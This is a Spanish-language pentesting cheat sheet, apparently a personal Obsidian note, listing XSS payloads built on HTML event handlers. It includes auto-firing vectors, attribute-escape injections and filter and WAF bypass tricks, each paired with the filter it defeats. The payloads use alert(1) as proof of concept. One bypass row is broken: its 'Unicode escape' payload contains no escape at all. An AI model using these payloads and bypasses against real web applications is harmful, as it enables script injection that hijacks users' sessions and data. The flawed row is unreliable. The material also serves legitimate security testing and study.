---
aliases: null
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Manejadores de Eventos HTML

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<img src="x" onerror="alert(1)">` | XSS automático al fallar carga de `x` | Vector más confiable. Filtro `<script>` filtrado. |
| `<svg onload="alert(1)">` | XSS automático al renderizar SVG | Tag `<img>` filtrado o whitelist solo permite SVG. |
| `<input autofocus onfocus="alert(1)">` | XSS automático sin interacción — `autofocus` dispara `onfocus` | Filtros bloquean `onerror`/`onload`. |
| `<details open ontoggle="alert(1)">` | XSS automático — `open` cambia state, dispara `ontoggle` | Vector poco común, bypassea WAFs viejos. |
| `<select autofocus onfocus=alert(1)><option>x</option></select>` | Mismo patrón que input autofocus | Alternativa cuando `<input>` filtrado. |
| `<keygen autofocus onfocus=alert(1)>` | XSS via tag deprecada pero soportada en algunos browsers | Targets legacy. |
| `<video><source onerror=alert(1)>` | XSS al fallar carga de `<source>` | Filtros que solo bloquean `<img>`. |
| `<audio src=x onerror=alert(1)>` | Mismo principio con audio | Alt. |
| `<body onload=alert(1)>` | Si controlás reflejo en `<body>` o sale al top-level | Reflexión en HTML body raíz. |
| `<h1 onmouseover="alert(1)">hover</h1>` | XSS al pasar mouse | Vector interactivo — requiere acción usuario. |
| `<a href="#" onclick="alert(1)">click</a>` | XSS al click | Interactivo. |
| `<style>@keyframes x{}</style><x style="animation-name:x" onanimationstart="alert(1)">` | XSS automático via CSS animation | Bypass avanzado de WAFs. |
| `<body onhashchange="alert(1)">` + `<a href="#x">click</a>` | XSS en SPAs al cambiar fragment | Apps single-page navigation-based. |
^xss-eventos

### Escape de atributo con event handler

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `" autofocus onfocus="alert(1)` | Sale del atributo, agrega event handler sin cerrar tag | Reflejo en `<input value="INYECCIÓN">`. `<`/`>` filtrados. |
| `" type="image" src="x" onerror="alert(1)` | Override del `type` del input para habilitar `onerror` | Reflejo en `<input type="hidden" value="INYECCIÓN">`. |
| `' onmouseover='alert(1)` | Variante con comillas simples | Reflejo en `value='INYECCIÓN'`. |
| `x onerror=alert(1)//` | Espacio como separador en HTML sin comillas | Reflejo en `<img src=INYECCIÓN>` (sin comillas). |
^xss-eventos-escape

### Bypass de filtros léxicos

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<svg/onload=alert(1)>` | Slash en vez de espacio entre tag y atributo | Filtro regex `<svg ` (con espacio). |
| `<sVg OnLoAd=alert(1)>` | Mixed-case bypass | Regex case-sensitive. |
| `<svg onload=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>` | HTML entities decoded antes de JS | Filtro busca literal `alert`. |
| `<svg onload="alert(1)">` | Unicode escape en JS dentro de event handler | Filtro bloquea `alert` pero deja `\u`. |
^xss-eventos-bypass

___

## Overview

Cuando `<script>` está blacklisted, event handlers permiten ejecutar JS via atributos `on*` en tags permitidas.

**Auto-disparados (preferidos):** `onerror` (img/audio/video con src inválido), `onload` (svg/iframe/body), `onfocus`+`autofocus`, `ontoggle`+`details open`, `onanimationstart` con CSS keyframe.

**Requieren interacción:** `onclick`, `onmouseover`, `onhashchange`. Menos confiables pero válidos para PoC.

Para escapar atributo sin disparar `<`/`>` filter → ver tabla `escape de atributo` arriba.

***
